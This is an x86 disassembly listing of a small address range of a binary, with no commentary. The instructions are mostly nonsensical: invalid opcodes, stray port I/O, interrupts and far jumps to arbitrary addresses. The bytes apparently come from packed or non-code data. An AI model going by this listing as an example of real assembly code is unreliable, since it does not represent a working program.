  412cfc:	fidivr WORD PTR [ecx-0x2d134222]
  412d02:	add    DWORD PTR [ebx],eax
  412d04:	into   
  412d05:	ret    0xdec2
  412d08:	neg    ch
  412d0a:	add    al,BYTE PTR [edx]
  412d0c:	add    bh,bl
  412d0e:	or     al,BYTE PTR [edx]
  412d10:	out    dx,eax
  412d11:	cli    
  412d12:	int3   
  412d13:	lods   al,BYTE PTR ds:[esi]
  412d14:	lds    esi,FWORD PTR [edx-0x41f3a44]
  412d1a:	(bad)
  412d1d:	fucomi st,st(2)
  412d1f:	sar    dh,1
  412d21:	cmc    
  412d22:	mov    edx,0xf5dcfaf1
  412d27:	not    ah
  412d29:	bnd jmp 0xe428fd0a
  412d2f:	jmp    0xee2afd00
  412d34:	lock ret 
  412d36:	retf   0xf4cf
  412d39:	mov    dh,0xe5
  412d3b:	clc    
  412d3c:	int    0xee
  412d3e:	aam    0xbd
  412d40:	(bad)  
  412d42:	neg    ebp
  412d44:	in     al,dx
  412d45:	out    dx,al
  412d46:	aad    0xc6
  412d48:	push   es
  412d49:	in     al,0xea
  412d4b:	fcmovnu st,st(1)
  412d4d:	lds    ecx,FWORD PTR [edi+eax*1]
  412d50:	or     BYTE PTR ds:0xafe2d0d9,al
  412d56:	not    cl
  412d58:	imul   edi
  412d5a:	fdiv   st,st(7)
  412d5c:	(bad)  
  412d5d:	div    bh
  412d5f:	call   0xd91f2840
  412d64:	out    dx,eax
  412d65:	repnz fsubr st(6),st
  412d68:	add    dh,dl
  412d6a:	pop    es
  412d6b:	add    edi,ecx
  412d6d:	jmp    0xf2220d4c
  412d72:	(bad)  
  412d73:	mov    al,0xed
  412d75:	mov    al,0xd6
  412d77:	(bad)
  412d7a:	retf   
  412d7b:	shl    DWORD PTR [ecx-0x2f372e1a],1
  412d81:	shr    dh,1
  412d83:	add    ebx,edx
  412d85:	stc    
  412d86:	sar    ebp,1
  412d88:	idiv   ch
  412d8a:	cld    
  412d8b:	add    eax,ecx
  412d8d:	add    al,0xe5
  412d8f:	add    cl,BYTE PTR [ecx]
  412d91:	fsub   st(1),st
  412d93:	retf   0xf0de
  412d96:	hlt    
  412d97:	shr    BYTE PTR [eax+esi*4-0x62c464b],0xfa
  412d9f:	mov    ch,0xbb
  412da1:	mov    ebp,0xc207d0f8
  412da6:	loope  0x412d8b
  412da8:	icebp  
  412da9:	add    eax,0xfbeed4de
  412dae:	fxch   st(5)
  412db0:	out    dx,eax
  412db1:	cld    
  412db2:	jecxz  0x412d77
  412db4:	test   al,0xc1
  412db6:	jecxz  0x412d82
  412db8:	(bad)  
  412db9:	test   al,0xb9
  412dbb:	cli    
  412dbc:	rcr    edx,1
  412dbe:	icebp  
  412dbf:	ror    bl,cl
  412dc1:	int3   
  412dc2:	mov    esp,0xb4ded3
  412dc7:	jecxz  0x412da1
  412dc9:	dec    bl
  412dcb:	fdivp  st(1),st
  412dcd:	(bad)  
  412dce:	fmul   st(1),st
  412dd0:	in     eax,0x11
  412dd2:	mov    esi,0xb2bebff3
  412dd7:	jmp    0xb206e1a7
  412ddc:	int    0xf8
  412dde:	mov    bl,0xb5
  412de0:	mov    edx,0xc0c3bdce
  412de5:	test   BYTE PTR [esi*8-0xb2e063a],0xc8
  412ded:	mov    ebp,0xdee3cb0b
  412df3:	test   eax,0xd4eecfec
  412df8:	mov    dl,0xf2
  412dfb:	shl    BYTE PTR [eax+edx*8-0x27294645],cl
  412e02:	leave  
  412e03:	sti    
  412e04:	lock add ah,bh
  412e07:	aad    0xf2
  412e09:	add    al,0xfc
  412e0b:	fst    st(6)
  412e0d:	jmp    0xcbc7:0xfcc4e100
  412e14:	icebp  
  412e15:	xlat   BYTE PTR ds:[ebx]
  412e16:	mov    ebp,0xb7e6b7d0
  412e1b:	ror    ch,1
  412e1d:	aad    0xc8
  412e1f:	xlat   BYTE PTR ds:[ebx]
  412e20:	cmc    
  412e21:	mov    esp,0x5eff3fe
  412e26:	loop   0x412e03
  412e28:	fild   WORD PTR [esp+eiz*8]
  412e2b:	retf   0x803
  412e2e:	(bad)  
  412e2f:	(bad)  
  412e30:	jmp    edi
  412e32:	lock mov edi,0xece6e9cb
  412e38:	jecxz  0x412ded
  412e3a:	in     al,dx
  412e3b:	jmp    0xf1d8:0xc9fecbee
  412e42:	int3   
  412e43:	(bad)  
  412e45:	lock idiv ebx
  412e48:	xbegin 0xce50054e
  412e4e:	mov    BYTE PTR [edx],0xc
  412e51:	or     cl,al
  412e53:	stos   BYTE PTR es:[edi],al
  412e54:	loope  0x412e3e
  412e56:	(bad)  
  412e57:	ror    dl,1
  412e59:	loop   0x412e2d
  412e5b:	retf   0xf8e4
  412e5e:	in     eax,dx
  412e5f:	fst    st(5)
  412e61:	repnz fdiv st(2),st
  412e64:	fcmovbe st,st(0)
  412e66:	shl    esp,0xc5
  412e69:	retf   0xd508
  412e6c:	push   cs
  412e6d:	into   
  412e6e:	out    dx,eax
  412e6f:	stc    
  412e70:	into   
  412e71:	retf   
  412e72:	iret   
  412e73:	(bad)  
  412e75:	lods   eax,DWORD PTR ds:[esi]
  412e76:	imul   BYTE PTR [ebp-0x294b1920]
  412e7c:	out    dx,al
  412e7d:	(bad)  
  412e7e:	not    edi
  412e80:	mov    edi,0xc1dac9f4
  412e85:	sar    ch,1
  412e87:	add    al,0xf4
  412e89:	out    0x3,eax
  412e8b:	hlt    
  412e8c:	psubsw mm3,mm1
  412e8f:	or     cl,BYTE PTR [edi+edi*8]
  412e92:	(bad)  
  412e93:	ror    eax,1
  412e95:	(bad)  
  412e96:	in     eax,dx
  412e97:	hlt    
  412e98:	repnz out 0xd6,al
  412e9b:	leave  
  412e9c:	(bad)  
  412e9d:	leave  
  412e9e:	bnd jmp 0x412e64
  412ea1:	add    edi,ebx
  412ea3:	(bad)  
  412ea5:	cmc    
  412ea6:	push   es
  412ea7:	(bad)  
  412ea8:	sar    ebx,1
  412eaa:	loop   0x412e7c
  412eac:	xlat   BYTE PTR ds:[ebx]
  412ead:	jmp    edx
  412eaf:	in     eax,dx
  412eb0:	out    0xd,al
  412eb2:	(bad)  
  412eb3:	out    dx,eax
  412eb4:	shl    ch,cl
  412eb6:	ret    0xf1bc
  412eb9:	int    0xfb
  412ebb:	sar    BYTE PTR [edx-0x15440d2c],1
  412ec1:	add    al,BYTE PTR [eax]
  412ec3:	sar    DWORD PTR [esp+edi*8-0x3d0f2208],0xde
  412ecb:	leave  
  412ecc:	(bad)  
  412ece:	or     esi,ebx
  412ed0:	or     bh,cl
  412ed2:	ret    
  412ed3:	(bad)  
  412ed5:	(bad)  
  412ed6:	out    0xd1,eax
  412ed8:	ret    0xcbac
  412edb:	repnz xlat BYTE PTR ds:[ebx]
  412edd:	mov    edx,0xd0bbe3f7
  412ee2:	rcl    ebx,cl
  412ee4:	out    0xf8,al
  412ee6:	lock fadd st(5),st
  412ee9:	lock (bad) 
  412eeb:	hlt    
  412eec:	or     BYTE PTR ds:0xcd0e08ec,cl
  412ef2:	les    esi,FWORD PTR [ebx-0x533d481b]
  412ef8:	ror    al,cl
  412efa:	cmc    
  412efb:	mov    dl,0xb4
  412efd:	sar    BYTE PTR [edx-0x42221341],1
  412f03:	mov    edi,0xddedd0fe
  412f08:	fstp   st(4)
  412f0a:	fdivp  st(7),st
  412f0c:	loope  0x412ece
  412f0e:	aad    0xe
  412f10:	jmp    0xf4c0:0xbfebdcce
  412f17:	cmc    
  412f18:	jmp    0xb8fb07eb
  412f1d:	shl    DWORD PTR [ebp-0x12321342],1
  412f23:	cld    
  412f24:	jecxz  0x412ef8
  412f26:	push   es
  412f27:	out    0xfa,al
  412f29:	shl    esi,1
  412f2b:	fcmovnbe st,st(7)
  412f2d:	in     eax,0x2
  412f2f:	call   0xef32383b
  412f34:	iret   
  412f35:	test   al,0xd7
  412f37:	mov    esp,0xe6daecd2
  412f3c:	stc    
  412f3d:	xlat   BYTE PTR ds:[ebx]
  412f3e:	jmp    0xf50c2919
  412f43:	aam    0xfc
  412f45:	rol    dh,0xc2
  412f48:	(bad)  
  412f49:	mul    ecx
  412f4b:	in     eax,0xc6
  412f4d:	out    0xfc,al
  412f4f:	or     DWORD PTR [esi],ecx
  412f51:	call   edx
  412f53:	icebp  
  412f54:	lods   eax,DWORD PTR ds:[esi]
  412f55:	(bad)
  412f58:	jmp    0xf9b9:0xe8c7c5c9
  412f5f:	mov    dl,0xe2
  412f61:	mov    esi,0xc1f1cecf
  412f66:	icebp  
  412f67:	aam    0x3
  412f69:	retf   
  412f6a:	(bad)  
  412f6b:	sti    
  412f6c:	in     al,0xe2
  412f6e:	sti    
  412f6f:	fsincos 
  412f71:	out    0xa9,eax
  412f73:	rcr    ebp,1
  412f75:	ror    ah,cl
  412f77:	fnsetpm(287 only) 
  412f79:	out    0xb3,eax
  412f7b:	fcmove st,st(4)
  412f7d:	enter  0xb4df,0xde
  412f81:	leave  
  412f82:	test   bl,0xda
  412f85:	xlat   BYTE PTR ds:[ebx]
  412f86:	rcl    eax,cl
  412f88:	out    0xc3,al
  412f8a:	lock out 0xd5,eax
  412f8d:	loop   0x412f73
  412f8f:	or     bl,cl
  412f91:	push   cs
  412f92:	ret    0xa8aa
  412f95:	scas   eax,DWORD PTR es:[edi]
  412f96:	rcl    bl,0xf5
  412f99:	icebp  
  412f9a:	in     eax,0xf1
  412f9c:	mov    al,0xe5
  412f9e:	sar    dh,cl
  412fa0:	cmc    
  412fa1:	shl    ecx,cl
  412fa3:	shr    ch,0xfa
  412fa6:	aam    0xe3
  412fa8:	(bad)  
  412fa9:	(bad)  
  412faa:	sti    
  412fab:	fcom   st(5)
  412fad:	add    al,0xf8
  412faf:	into   
  412fb0:	into   
  412fb1:	psllw  mm1,mm7
  412fb4:	fmulp  st(5),st
  412fb6:	mov    dh,0xf3
  412fb8:	into   
  412fb9:	(bad)  
  412fba:	xlat   BYTE PTR ds:[ebx]
  412fbb:	(bad)  
  412fbc:	(bad)  
  412fbe:	fldpi  
  412fc0:	fsub   st(0),st
  412fc2:	fdivr  st,st(2)
  412fc4:	loope  0x412fa0
  412fc6:	loope  0x412fcc
  412fc8:	mov    ecx,0xeffac9ca
  412fce:	jmp    0xb3d0:0xebeefcfd
  412fd5:	icebp  
  412fd6:	mov    bl,0xe2
  412fd8:	mov    dh,0xf5
  412fda:	iret   
  412fdb:	mov    dl,0xda
  412fdd:	iret   
  412fde:	rol    ah,cl
  412fe0:	(bad)  
  412fe2:	faddp  st(3),st
  412fe4:	rol    DWORD PTR [ebx],0xdd
  412fe7:	(bad)  
  412fe8:	mov    ebp,0xf6c7e001
  412fed:	(bad)  
  412fef:	in     al,0xe3
  412ff1:	or     dh,ah
  412ff3:	loopne 0x412fc1
  412ff5:	(bad)  
  412ff6:	stos   DWORD PTR es:[edi],eax
  412ff7:	ret    0xb0d3
  412ffa:	sti    
  412ffb:	aad    0xc7
  412ffd:	lods   al,BYTE PTR ds:[esi]
  412ffe:	(bad)  
  412fff:	jmp    0xfec1:0xcfecdcb9
  413006:	shl    eax,0xe6
  413009:	add    edx,ecx
  41300b:	cmc    
  41300c:	(bad)  
  41300e:	add    eax,0xbccfcbd9
  413013:	scas   al,BYTE PTR es:[edi]
  413014:	retf   0xc2e1
  413017:	lods   al,BYTE PTR ds:[esi]
  413018:	not    dl
  41301a:	mov    cl,0xfb
  41301c:	icebp  
  41301d:	rcr    ch,cl
  41301f:	retf   0xf8f7
  413022:	ret    
  413023:	lock repnz loope 0x413006
  413027:	add    eax,DWORD PTR [edx+eiz*8]
  41302a:	aam    0xe6
  41302c:	add    al,0x3
  41302e:	cld    
  41302f:	repz int 0xf
  413032:	out    0xc8,eax
  413034:	repz test al,0xb6
  413037:	mov    dl,0xcc
  413039:	aad    0xc6
  41303b:	int3   
  41303c:	hlt    
  41303d:	enter  0xcbd7,0xd2
  413041:	(bad)  
  413042:	test   bh,0xc3
  413045:	(bad)  
  413046:	icebp  
  413047:	sar    BYTE PTR [ecx-0x18264040],cl
  41304d:	in     al,0xc4
  41304f:	stc    
  413050:	fimul  WORD PTR ds:0xaeb3c4bd
  413056:	shl    dh,0xad
  413059:	retf   
  41305a:	retf   0xf3b6
  41305d:	mov    ecx,0xddcee9e9
  413062:	stc    
  413063:	out    dx,al
  413064:	fiadd  WORD PTR [edx]
  413066:	repnz add edx,edi
  413069:	mov    eax,0xde0edee4
  41306e:	loope  0x41303f
  413070:	stc    
  413071:	adc    cl,ah
  413073:	loope  0x413031
  413075:	shl    eax,1
  413077:	out    dx,al
  413078:	mov    ebx,0xf3cde8f9
  41307d:	shl    DWORD PTR [ebx-0x42292b41],cl
  413083:	sar    DWORD PTR [ebp-0x283ffd4c],1
  413089:	or     esi,edi
  41308b:	add    bh,BYTE PTR [ebp+0x4edc3ed]
  413091:	loopne 0x413050
  413093:	mov    dl,0xe6
  413095:	out    dx,al
  413096:	shl    ch,cl
  413098:	int    0xf9
  41309a:	retf   
  41309b:	mov    cl,0xdf
  41309d:	fdivr  DWORD PTR [ecx-0x17111130]
  4130a3:	faddp  st(2),st
  4130a5:	fild   WORD PTR [edx]
  4130a7:	aad    0x1
  4130a9:	ret    0xd0fa
  4130ac:	mov    ebp,0xac8dde9
  4130b1:	fdivrp st(1),st
  4130b3:	out    0xe4,eax
  4130b5:	loopne 0x413074
  4130b7:	mov    esp,0xf5ebcea9
  4130bc:	(bad)
  4130bf:	mov    eax,0xf7dbb0fd
  4130c4:	out    dx,al
  4130c5:	(bad)  
  4130c6:	aad    0xc0
  4130c8:	(bad)  
  4130c9:	or     ah,bl
  4130cb:	out    0xea,eax
  4130cd:	clc    
  4130ce:	jmp    0x4130b4
  4130d0:	add    bh,ah
  4130d2:	test   eax,0xd2e3dfee
  4130d7:	loopne 0x41308e
  4130d9:	in     al,dx
  4130da:	cli    
  4130db:	clc    
  4130dc:	mov    edx,0x2f3facd
  4130e1:	idiv   eax
  4130e3:	mov    eax,0x1fce2dc
  4130e8:	(bad)  
  4130e9:	or     ecx,ecx
  4130eb:	(bad)
  4130ee:	in     al,dx
  4130ef:	in     al,dx
  4130f0:	or     al,0xde
  4130f2:	mov    dl,0xc9
  4130f4:	loop   0x4130de
  4130f6:	in     al,dx
  4130f7:	shr    cl,1
  4130f9:	not    bl
  4130fb:	ror    ebx,1
  4130fd:	lods   al,BYTE PTR ds:[esi]
  4130fe:	mov    edx,0xf8d3d6da
  413103:	fdivrp st(5),st
  413105:	add    BYTE PTR [ebx],al
  413107:	aam    0xc6
  413109:	(bad)  
  41310a:	jmp    0xfecf:0xc7ffdad6
  413111:	cli    
  413112:	icebp  
  413113:	faddp  st(2),st
  413115:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413116:	int    0xe2
  413118:	mov    cl,0xba
  41311a:	rol    ah,0xca
  41311d:	repz hlt 
  41311f:	in     eax,dx
  413120:	mov    edx,0xf2c1e0bd
  413125:	fucom  st(5)
  413127:	add    eax,edx
  413129:	stc    
  41312a:	jmp    0x41310e
  41312c:	fadd   QWORD PTR ds:0x6edd4f5
  413132:	loope  0x413102
  413134:	(bad)
  413137:	in     al,dx
  413138:	(bad)  
  413139:	cli    
  41313a:	repz shl ch,0xac
  41313e:	fsubr  st,st(3)
  413140:	mov    edi,0xecd8eef4
  413145:	clc    
  413146:	repnz mov esp,0x4db0aea
  41314c:	loop   0x413144
  41314e:	cld    
  41314f:	jmp    edi
  413151:	stc    
  413152:	mov    ebp,0xc2e7f1e0
  413157:	ret    0xa8e2
  41315a:	les    edi,FWORD PTR [edx-0x36082606]
  413160:	cmc    
  413161:	out    dx,eax
  413162:	icebp  
  413163:	cld    
  413164:	hlt    
  413165:	mov    esp,0xc2dd01ec
  41316a:	mov    edi,0xf4dbfde1
  41316f:	fcmove st,st(7)
  413171:	(bad)  
  413173:	mov    edi,0xe0cccbca
  413178:	retf   
  413179:	fcmovb st,st(6)
  41317b:	mov    al,0xea
  41317d:	shl    BYTE PTR [ebp+0xd6fac8],1
  413183:	(bad)  
  413185:	fidivr DWORD PTR [edi+edi*8-0x25153a0a]
  41318c:	add    eax,0xede5fd05
  413191:	adc    esp,ecx
  413193:	mov    eax,0xc4e4f7b2
  413198:	ret    
  413199:	test   al,0xcd
  41319b:	repnz mov dh,0xb7
  41319e:	cli    
  41319f:	int    0xf6
  4131a1:	mov    al,0xbd
  4131a3:	out    dx,al
  4131a4:	cli    
  4131a5:	add    eax,0xe0c2defc
  4131aa:	stc    
  4131ab:	add    al,BYTE PTR [edx]
  4131ad:	or     ecx,DWORD PTR ds:0xc206e002
  4131b3:	test   eax,0xcfc8b3cd
  4131b8:	in     al,0xfb
  4131ba:	hlt    
  4131bb:	lock out 0xf8,eax
  4131be:	std    
  4131bf:	sar    DWORD PTR [ebx-0x21210c18],cl
  4131c5:	add    eax,0xff07d2d1
  4131ca:	faddp  st(7),st
  4131cc:	loopne 0x4131d3
  4131ce:	out    dx,al
  4131cf:	std    
  4131d0:	jmp    0xd400fa9e
  4131d5:	icebp  
  4131d6:	into   
  4131d7:	loopne 0x4131c6
  4131d9:	out    0xca,al
  4131db:	iret   
  4131dc:	(bad)
  4131e0:	leave  
  4131e1:	stc    
  4131e2:	rcr    edi,1
  4131e4:	imul   esp
  4131e6:	add    edx,eax
  4131e8:	call   edx
  4131ea:	imul   bl
  4131ec:	fiadd  DWORD PTR [eax+ecx*1]
  4131ef:	or     al,0xb
  4131f1:	leave  
  4131f2:	mov    cl,0xcc
  4131f4:	jmp    0x4131b8
  4131f6:	loope  0x4131ef
  4131f8:	mov    al,0xfa
  4131fa:	jmp    0x4131b0
  4131fc:	fsincos 
  4131fe:	mov    eax,0xd8bb02d8
  413203:	add    esp,esi
  413205:	cli    
  413206:	xlat   BYTE PTR ds:[ebx]
  413207:	mul    bh
  413209:	ret    
  41320a:	or     bh,bl
  41320c:	jmp    0xc4f0ed9
  413211:	loopne 0x4131f6
  413213:	shr    BYTE PTR [ecx-0x1b171c58],cl
  413219:	in     eax,dx
  41321a:	shl    BYTE PTR [ecx-0xa0b2c],0xfe
  413221:	enter  0xf3f6,0xfb
  413225:	fistp  QWORD PTR [esi+ebx*8+0x30abcc1]
  41322c:	or     ecx,ebx
  41322e:	(bad)
  413231:	add    ebp,ecx
  413233:	mov    eax,0xc4e7c2e4
  413238:	ret    0xdadb
  41323b:	(bad)  
  41323c:	iret   
  41323d:	not    ch
  41323f:	rol    ebx,1
  413241:	jecxz  0x41323f
  413243:	xlat   BYTE PTR ds:[ebx]
  413244:	add    edx,esp
  413246:	(bad)  
  413247:	cld    
  413248:	out    0xf1,al
  41324a:	retf   
  41324b:	aad    0xdc
  41324d:	out    0xd4,al
  41324f:	les    ecx,FWORD PTR [ebx]
  413251:	fisubr DWORD PTR [edx-0x1a524310]
  413257:	in     eax,dx
  413258:	in     eax,0xb5
  41325a:	out    dx,eax
  41325b:	enter  0xccf9,0xea
  41325f:	fldlg2 
  413261:	repnz sar al,cl
  413264:	shl    bh,0xd2
  413267:	mov    esp,0xfdc0cbf8
  41326c:	xlat   BYTE PTR ds:[ebx]
  41326d:	out    0xda,al
  41326f:	out    0xc9,al
  413271:	pop    es
  413272:	in     al,dx
  413273:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413274:	jmp    0xb0f4:0xd4c1cbc2
  41327b:	out    0xd5,al
  41327d:	(bad)  
  41327e:	jmp    0xfbfa:0xfbb8fbb4
  413285:	rcr    ebx,cl
  413287:	(bad)  
  413289:	rol    DWORD PTR [eax],0xc1
  41328c:	hlt    
  41328d:	(bad)  
  41328e:	out    0xc8,al
  413290:	int    0xff
  413292:	stos   DWORD PTR es:[edi],eax
  413293:	neg    esp
  413295:	int    0xf3
  413297:	loopne 0x413286
  413299:	cmc    
  41329a:	shr    ebx,0xbf
  41329d:	aam    0xbe
  41329f:	clc    
  4132a0:	out    dx,al
  4132a1:	call   edx
  4132a3:	jecxz  0x41328b
  4132a5:	(bad)  
  4132a6:	cli    
  4132a7:	cli    
  4132a8:	aam    0xbc
  4132aa:	aad    0xe8
  4132ac:	shr    al,0x0
  4132af:	(bad)  
  4132b0:	out    dx,al
  4132b1:	fldz   
  4132b3:	loop   0x413285
  4132b5:	jecxz  0x413269
  4132b7:	int    0xeb
  4132b9:	into   
  4132ba:	aam    0xf6
  4132bc:	mov    eax,0xcaebeed9
  4132c1:	aam    0xfa
  4132c3:	rol    cl,1
  4132c5:	add    eax,0xe3dce2d8
  4132ca:	add    eax,0xefdffdd5
  4132cf:	jmp    0x4132be
  4132d1:	(bad)  
  4132d2:	rcl    ecx,cl
  4132d4:	lods   eax,DWORD PTR ds:[esi]
  4132d5:	shr    al,1
  4132d7:	mov    bl,0xd5
  4132d9:	mov    cl,0xc9
  4132db:	mov    dl,0xb9
  4132dd:	fsin   
  4132df:	fucom  st(2)
  4132e1:	int    0xf9
  4132e3:	int3   
  4132e4:	call   edx
  4132e6:	clc    
  4132e7:	push   es
  4132e8:	fcomi  st,st(2)
  4132ea:	out    0xd5,al
  4132ec:	loop   0x4132bd
  4132ee:	in     eax,dx
  4132ef:	jmp    0xb3c3:0xc3c3dd13
  4132f6:	leave  
  4132f7:	int    0xee
  4132f9:	out    dx,eax
  4132fa:	fcom   st(7)
  4132fc:	sti    
  4132fd:	mov    ch,0xb8
  4132ff:	out    dx,eax
  413300:	mov    ch,0xb4
  413302:	xlat   BYTE PTR ds:[ebx]
  413303:	int    0xdd
  413305:	repz int 0xe6
  413308:	icebp  
  413309:	(bad)  
  41330b:	fldz   
  41330d:	idiv   cl
  41330f:	ret    0xf3dd
  413312:	mov    dl,0xd8
  413314:	lock shl ecx,cl
  413317:	(bad)
  41331a:	sti    
  41331b:	in     al,0xfa
  41331d:	out    dx,al
  41331e:	(bad)  
  413320:	call   0xe20500f5
  413325:	in     al,dx
  413326:	repnz hlt 
  413328:	(bad)
  41332b:	cld    
  41332c:	sti    
  41332d:	mov    esp,0xceff04d5
  413332:	shr    edx,cl
  413334:	loopne 0x4132f6
  413336:	mov    bh,0xd5
  413338:	iret   
  413339:	mov    edi,0xbed7ebef
  41333f:	repz add ebx,edx
  413342:	fld    DWORD PTR [edi]
  413344:	aad    0xc7
  413346:	fprem1 
  413348:	cmc    
  413349:	add    dl,al
  41334b:	mov    esi,0xead9f5ef
  413350:	in     eax,dx
  413351:	(bad)  [eax-0x42312d51]
  413357:	out    0xe9,eax
  413359:	lods   al,BYTE PTR ds:[esi]
  41335a:	shl    ch,1
  41335c:	int3   
  41335d:	leave  
  41335e:	out    dx,eax
  41335f:	in     eax,dx
  413360:	mov    ecx,0xd7bed8fe
  413365:	repnz in eax,0xf4
  413368:	lds    ecx,FWORD PTR [edx]
  41336a:	icebp  
  41336b:	fsubr  st(0),st
  41336d:	lds    eax,FWORD PTR [edi]
  41336f:	paddsb mm3,mm7
  413372:	(bad)  
  413373:	mul    ecx
  413375:	mov    dl,0xbd
  413377:	scas   al,BYTE PTR es:[edi]
  413378:	mov    dl,0xcb
  41337a:	int    0xb9
  41337c:	(bad)  
  41337d:	in     eax,0xd6
  41337f:	std    
  413380:	ror    dh,cl
  413382:	hlt    
  413383:	add    eax,DWORD PTR [edi]
  413385:	test   BYTE PTR [eax],0xd3
  413388:	add    ah,bl
  41338a:	fsqrt  
  41338c:	push   cs
  41338d:	aad    0xe6
  41338f:	fsubr  st(0),st
  413391:	loop   0x41337f
  413393:	mov    esp,0xb6e2a4cf
  413398:	(bad)  
  413399:	int3   
  41339a:	mov    ah,0xca
  41339c:	in     eax,0xcb
  41339e:	in     eax,dx
  41339f:	sar    esi,cl
  4133a1:	add    DWORD PTR [ecx+edx*8+0xfdf1d3],edi
  4133a8:	loope  0x41336d
  4133aa:	fcmovbe st,st(4)
  4133ac:	fsin   
  4133ae:	jmp    0xf344019d
  4133b3:	shr    ch,0xf0
  4133b6:	int    0xc1
  4133b8:	cli    
  4133b9:	out    0xdb,al
  4133bb:	jmp    0xf2fd:0xeaf1b9ee
  4133c2:	rcr    dh,1
  4133c4:	loopne 0x4133c9
  4133c6:	add    edi,ebx
  4133c8:	repnz ffree st(5)
  4133cb:	add    al,0xd4
  4133cd:	(bad)  
  4133cf:	(bad)  
  4133d1:	pop    es
  4133d2:	mov    dl,0xe3
  4133d4:	imul   DWORD PTR [edi-0x313a300e]
  4133da:	aad    0xc4
  4133dc:	mov    edx,0xb8ebeffd
  4133e1:	add    DWORD PTR [ebx],eax
  4133e3:	stc    
  4133e4:	stc    
  4133e5:	fadd   st,st(3)
  4133e7:	add    al,0xdb
  4133e9:	dec    BYTE PTR [eax]
  4133eb:	std    
  4133ec:	jecxz  0x4133e2
  4133ee:	add    al,0xfb
  4133f0:	enter  0xeaea,0xc7
  4133f4:	scas   eax,DWORD PTR es:[edi]
  4133f5:	jecxz  0x4133bb
  4133f7:	mov    bh,0xdb
  4133f9:	fcmove st,st(2)
  4133fb:	cmc    
  4133fc:	mov    ecx,0xbedbefc9
  413401:	loop   0x4133e3
  413403:	out    0xcf,eax
  413405:	std    
  413406:	add    al,BYTE PTR ds:0xe5df0704
  41340c:	test   BYTE PTR [eax],0xe8
  41340f:	(bad)
  413412:	int3   
  413413:	lock jmp 0xe43d03cc
  413419:	loopne 0x4133e9
  41341b:	in     al,0xb8
  41341d:	(bad)  
  41341e:	test   BYTE PTR [ebx],0xf6
  413421:	sti    
  413422:	in     eax,dx
  413423:	loop   0x4133e7
  413425:	shr    ebp,1
  413427:	add    cl,dl
  413429:	hlt    
  41342a:	add    edi,esi
  41342c:	(bad)  
  41342e:	or     ebp,esi
  413430:	iret   
  413431:	shl    ebx,cl
  413433:	lods   al,BYTE PTR ds:[esi]
  413434:	out    0xb7,al
  413436:	iret   
  413437:	sti    
  413438:	mov    al,0xfb
  41343a:	in     al,0xf3
  41343c:	in     eax,0xdd
  41343e:	in     al,dx
  41343f:	frndint 
  413441:	(bad)  
  413443:	aad    0xc1
  413445:	lock in al,dx
  413447:	fcmovbe st,st(0)
  413449:	loop   0x413447
  41344b:	clc    
  41344c:	push   es
  41344d:	hlt    
  41344e:	jmp    0xc9ad:0xbf130603
  413455:	lods   al,BYTE PTR ds:[esi]
  413456:	lods   eax,DWORD PTR ds:[esi]
  413457:	lock leave 
  413459:	mov    al,0xd2
  41345b:	mov    bh,0xce
  41345d:	aad    0xf1
  41345f:	repz shl ebp,1
  413462:	in     al,dx
  413463:	(bad)  
  413464:	mov    esp,0xd40403d8
  413469:	out    0xc6,eax
  41346b:	add    al,0xc5
  41346d:	in     al,0x3
  41346f:	out    dx,al
  413470:	int3   
  413471:	fistp  QWORD PTR [esi-0x183e3430]
  413477:	into   
  413478:	out    0xc5,eax
  41347a:	out    0xd4,eax
  41347c:	(bad)  
  41347d:	dec    ebx
  41347f:	cld    
  413480:	add    esi,edx
  413482:	loop   0x413463
  413484:	int    0xc2
  413486:	add    ebx,ebx
  413488:	neg    ebx
  41348a:	or     al,BYTE PTR [esi]
  41348c:	(bad)  
  41348e:	jecxz  0x41347c
  413490:	sti    
  413491:	loop   0x413474
  413493:	rol    cl,cl
  413495:	test   al,0xc0
  413497:	loope  0x413445
  413499:	mov    edx,0xcfbbfff3
  41349e:	in     eax,dx
  41349f:	out    dx,al
  4134a0:	shl    ah,cl
  4134a2:	(bad)  
  4134a3:	aad    0xf2
  4134a5:	sti    
  4134a6:	inc    edi
  4134a8:	shr    ebx,1
  4134aa:	(bad)  
  4134ac:	add    cl,BYTE PTR [ecx]
  4134ae:	or     al,0xce
  4134b0:	loopne 0x4134c5
  4134b2:	out    dx,eax
  4134b3:	mov    edi,0xb2f3dda8
  4134b8:	lods   al,BYTE PTR ds:[esi]
  4134b9:	fucomi st,st(2)
  4134bb:	retf   
  4134bc:	xlat   BYTE PTR ds:[ebx]
  4134bd:	mov    dh,0xf3
  4134bf:	std    
  4134c0:	(bad)  
  4134c2:	rcl    ecx,1
  4134c4:	ret    
  4134c5:	(bad)  
  4134c7:	add    edi,DWORD PTR [ecx+0xae0e4c2]
  4134cd:	out    dx,eax
  4134ce:	(bad)  
  4134d0:	in     eax,0xe1
  4134d2:	retf   
  4134d3:	(bad)  
  4134d5:	in     eax,0xef
  4134d7:	ror    bh,1
  4134d9:	les    esi,FWORD PTR [ebp-0x310a3929]
  4134df:	sar    DWORD PTR [edi+0xc8f5d9],cl
  4134e5:	stc    
  4134e6:	in     al,dx
  4134e7:	out    0x6,al
  4134e9:	retf   0xf6dd
  4134ec:	cli    
  4134ed:	sti    
  4134ee:	hlt    
  4134ef:	cli    
  4134f0:	fsubr  st(7),st
  4134f2:	int3   
  4134f3:	scas   al,BYTE PTR es:[edi]
  4134f4:	mov    esi,0xead3cfca
  4134f9:	retf   
  4134fa:	out    0xbb,al
  4134fc:	mov    ecx,0xeaf3cece
  413501:	fdivr  st,st(6)
  413503:	mov    esi,0x5e3d1de
  413508:	sar    eax,0xc3
  41350b:	loope  0x413509
  41350d:	pop    es
  41350e:	(bad)  
  41350f:	in     al,dx
  413510:	out    dx,eax
  413511:	fld    st(0)
  413513:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413514:	vpavgb xmm6,xmm3,XMMWORD PTR [edx-0x12142e18]
  41351c:	(bad)  
  41351e:	aam    0xea
  413520:	into   
  413521:	mov    edi,0xdad0f2b7
  413526:	sar    eax,cl
  413528:	jecxz  0x41352d
  41352a:	lock test edx,0xdae8ddfb
  413531:	or     al,0xd1
  413533:	fsubr  QWORD PTR [ecx-0x170d3244]
  413539:	enter  0xbad4,0xe7
  41353d:	mov    edx,0xfb03caf0
  413542:	fcmovb st,st(1)
  413544:	out    0xd6,eax
  413546:	(bad)  
  413548:	out    0xc0,eax
  41354a:	loop   0x413543
  41354c:	add    al,0xf
  41354e:	loopne 0x41354e
